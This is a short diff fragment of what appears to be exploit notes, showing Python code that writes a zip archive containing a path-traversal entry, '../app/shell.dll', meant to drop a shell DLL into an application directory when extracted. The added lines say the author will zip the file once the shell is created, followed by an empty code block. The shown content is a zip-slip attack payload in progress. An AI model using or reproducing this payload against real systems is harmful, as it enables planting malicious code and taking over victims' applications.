@@ -359,5 +359,9 @@ with zipfile.ZipFile('samples.zip', 'w') as z:
     # Path traversal to app directory
     z.writestr('../app/shell.dll', open('shell.dll', 'rb').read())
 ```
-I
+Ill use this short script to zip the file once ive created the shell
+
+```python
+
+```
 
